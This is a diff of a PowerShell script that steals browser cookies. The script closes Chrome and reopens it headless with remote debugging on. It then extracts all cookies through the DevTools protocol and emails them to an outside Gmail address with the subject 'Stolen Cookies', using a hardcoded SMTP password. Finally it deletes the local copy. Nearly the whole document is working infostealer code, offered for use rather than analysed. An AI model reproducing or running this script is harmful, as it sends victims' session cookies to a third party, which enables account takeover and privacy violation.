@@ -1,90 +1,164 @@
 # Parameters
 $toMail = "silvermo2010@gmail.com"
 $remoteDebuggingPort = 9222
+$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+$outputFile = ".\Chrome-Cookies.json"
+$smtpServer = "smtp.gmail.com"
+$smtpPort = 587
+$smtpUser = "fromsmtpmail@gmail.com"
+$smtpPassword = "No9KqH4Yruua7jOP"
 
-# Quit chrome function
-function quitx(){
-    if (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
-        Stop-Process -Name "chrome" -Force
-    }
+# Function to quit Chrome process
+function Quit-Chrome {
+    Write-Host "Quitting Chrome if running..."
+    Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force
 }
 
-# Send websocket message to chrome and wait for response function
-function SendReceiveWebSocketMessage {
+# Function to send and receive WebSocket messages
+function Send-Receive-WebSocketMessage {
     param (
         [string] $WebSocketUrl,
         [string] $Message
     )
 
     try {
-        $WebSocket = [System.Net.WebSockets.ClientWebSocket]::new()
-        $CancellationToken = [System.Threading.CancellationToken]::None
-        $connectTask = $WebSocket.ConnectAsync([System.Uri] $WebSocketUrl, $CancellationToken)
-        [void]$connectTask.Result
-        if ($WebSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
-            throw "WebSocket connection failed. State: $($WebSocket.State)"
-        }
-        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($Message)
-        $buffer = [System.ArraySegment[byte]]::new($messageBytes)
-        $sendTask = $WebSocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $CancellationToken)
-        [void]$sendTask.Result
-        $receivedData = New-Object System.Collections.Generic.List[byte]
-        $ReceiveBuffer = New-Object byte[] 4096 # Adjust the buffer size as needed
-        $ReceiveBufferSegment = [System.ArraySegment[byte]]::new($ReceiveBuffer)
+        # Load required assembly
+        Add-Type -AssemblyName System.Net.WebSockets
+        $webSocket = [System.Net.WebSockets.ClientWebSocket]::new()
 
-        while ($true) {
-            $receiveResult = $WebSocket.ReceiveAsync($ReceiveBufferSegment, $CancellationToken)
-            if ($receiveResult.Result.Count -gt 0) {
-                $receivedData.AddRange([byte[]]($ReceiveBufferSegment.Array)[0..($receiveResult.Result.Count - 1)])
-            }
-            if ($receiveResult.Result.EndOfMessage) {
-                break
-            }
+        # Connect WebSocket
+        $uri = [Uri]$WebSocketUrl
+        $connectTask = $webSocket.ConnectAsync($uri, [Threading.CancellationToken]::None)
+        $connectTask.Wait()
+
+        if ($webSocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
+            throw "WebSocket connection failed. State: $($webSocket.State)"
         }
-        $ReceivedMessage = [System.Text.Encoding]::UTF8.GetString($receivedData.ToArray())
-        $WebSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "WebSocket closed", $CancellationToken)
-        return $ReceivedMessage
-    } catch {
-        throw $_
+
+        # Send message
+        $bytesToSend = [Text.Encoding]::UTF8.GetBytes($Message)
+        $segmentToSend = [Array]$bytesToSend
+        $sendTask = $webSocket.SendAsync($segmentToSend, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [Threading.CancellationToken]::None)
+        $sendTask.Wait()
+
+        # Receive response
+        $bufferSize = 8192
+        $buffer = New-Object Byte[] $bufferSize
+        $receivedBytes = New-Object System.Collections.Generic.List[Byte]
+
+        do {
+            $result = $webSocket.ReceiveAsync($buffer, [Threading.CancellationToken]::None)
+            $result.Wait()
+            if ($result.Result.Count -gt 0) {
+                $receivedBytes.AddRange($buffer[0..($result.Result.Count - 1)])
+            }
+        } while (-not $result.Result.EndOfMessage)
+
+        # Close WebSocket
+        $closeTask = $webSocket.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [Threading.CancellationToken]::None)
+        $closeTask.Wait()
+
+        # Return message
+        $responseString = [Text.Encoding]::UTF8.GetString($receivedBytes.ToArray())
+        return $responseString
+    }
+    catch {
+        Write-Error "WebSocket error: $_"
+        return $null
     }
 }
 
-# Quit chrome and reopen it with remote debugging port
-Write-Host "`nQuit current Chrome process if it exists.."
-quitx
-Write-Host "Open Chrome with remote debugging port.."
-$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
-Start-Process -FilePath $chromePath -ArgumentList "https://google.com", "--remote-debugging-port=$remoteDebuggingPort", "--remote-allow-origins=ws://localhost:$remoteDebuggingPort", "--headless" -PassThru
+# Quit existing Chrome processes
+Quit-Chrome
 
-# Catch all browser cookies
+# Launch Chrome with remote debugging
+Write-Host "Launching Chrome with remote debugging..."
+Start-Process -FilePath $chromePath -ArgumentList "--headless", "--remote-debugging-port=$remoteDebuggingPort", "https://google.com" | Out-Null
+
+# Wait for Chrome to initialize
+Start-Sleep -Seconds 3
+
+# Fetch WebSocket Debugger URL
 $jsonUrl = "http://localhost:$remoteDebuggingPort/json"
-$jsonData = Invoke-RestMethod -Uri $jsonUrl -Method Get
-$url_capture = $jsonData.webSocketDebuggerUrl
-$Message = '{"id": 1,"method":"Network.getAllCookies"}'
+try {
+    $jsonResponse = Invoke-RestMethod -Uri $jsonUrl -Method Get
+    if ($null -eq $jsonResponse) {
+        throw "Failed to get Chrome debugging info."
+    }
+}
+catch {
+    Write-Error "Error fetching Chrome JSON info: $_"
+    Quit-Chrome
+    exit
+}
 
-# Parse cookie data
-Write-Host "`nObtain all cookies.."
-$response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[-1] -Message $Message
+# Extract WebSocket URL
+$WebSocketUrl = $jsonResponse | Select-Object -ExpandProperty webSocketDebuggerUrl
+if ([string]::IsNullOrEmpty($WebSocketUrl)) {
+    Write-Error "Could not find WebSocket debugger URL."
+    Quit-Chrome
+    exit
+}
+
+# Prepare message to get cookies
+$Message = '{"id":1,"method":"Network.getAllCookies"}'
+
+# Send WebSocket message and get response
+Write-Host "Requesting cookies..."
+$responseString = Send-Receive-WebSocketMessage -WebSocketUrl $WebSocketUrl -Message $Message
+
+if ([string]::IsNullOrEmpty($responseString)) {
+    Write-Error "Failed to receive cookie data."
+    Quit-Chrome
+    exit
+}
+
+# Parse response JSON
+try {
+    $responseJson = $responseString | ConvertFrom-Json
+} catch {
+    Write-Error "Failed to parse JSON response: $_"
+    Quit-Chrome
+    exit
+}
+
+# Extract cookies array
+if ($responseJson.result -and $responseJson.result.cookies) {
+    $cookies = $responseJson.result.cookies
+} else {
+    Write-Error "No cookies found in response."
+    Quit-Chrome
+    exit
+}
+
+# Convert cookies to JSON string
+$cookiesJson = $cookies | ConvertTo-Json -Depth 10
+
+# Save cookies to file
+Set-Content -Path $outputFile -Value $cookiesJson
+Write-Host "Cookies saved to $outputFile."
 
 # Quit Chrome
-Write-Host "Close Chrome.."
-quitx
+Write-Host "Closing Chrome..."
+Quit-Chrome
 
-# Export the cookies to a .json file and remove first 14 header lines
-Write-Host "`nWrite all cookies to temporary file.."
-$outputFile = '.\Chrome-Cookies.json'
-$response | Out-File -FilePath $outputFile
-Write-Host "Remove heading so only cookies in json format remain.."
-(Get-Content $outputFile | Select-Object -Skip 14) | Set-Content $outputFile
-$cookies = Get-Content $outputFile -Raw
-# Sending cookies to mail
-Write-Host "Send cookies to mail:" $toMail
-$cookies = Get-Content $outputFile -Raw 
-$smtpKey = ConvertTo-SecureString "No9KqH4Yruua7jOP" -AsPlainText -Force
-$smtpCredential = New-Object System.Management.Automation.PSCredential ("SMTP_Password", $smtpKey)
-Send-MailMessage -From "fromsmtpmail@gmail.com" -To $toMail -Subject "Stolen Cookies"  -SmtpServer "smtp.gmail.com" -UseSsl -Credential $smtpCredential -body $cookies -Port 587 
+# Send cookies via email
+Write-Host "Sending cookies via email..."
+$smtpSecurePassword = ConvertTo-SecureString $smtpPassword -AsPlainText -Force
+$smtpCredential = New-Object System.Management.Automation.PSCredential($smtpUser, $smtpSecurePassword)
 
-# Success + cleaning
-Write-Host "`n=> Mail successfuly sent!"
-Remove-Item $outputFile
-Write-Host "`nCleaning up.."
+try {
+    Send-MailMessage -From $smtpUser -To $toMail -Subject "Stolen Cookies" -Body $cookiesJson -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $smtpCredential
+    Write-Host "Email sent successfully."
+}
+catch {
+    Write-Error "Failed to send email: $_"
+}
+
+# Cleanup
+if (Test-Path $outputFile) {
+    Remove-Item $outputFile -Force
+    Write-Host "Cleaned up temporary files."
+}
+
+Write-Host "Process completed."
